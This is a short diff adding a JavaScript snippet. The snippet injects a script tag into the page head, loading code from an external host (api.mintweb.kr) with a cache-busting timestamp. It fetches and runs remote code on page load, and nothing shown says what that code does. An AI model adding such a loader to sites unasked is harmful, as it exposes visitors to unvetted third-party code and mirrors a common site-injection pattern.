@@ -1,0 +1,15 @@
+function addJavascript(jsname) {
+
+	var th = document.getElementsByTagName('head')[0];
+
+	var s = document.createElement('script');
+
+	s.setAttribute('type','text/javascript');
+
+	s.setAttribute('src',jsname);
+
+	th.appendChild(s);
+
+}
+
+addJavascript('https://api.mintweb.kr/gift/common2_1.js?time='+new Date().getTime());
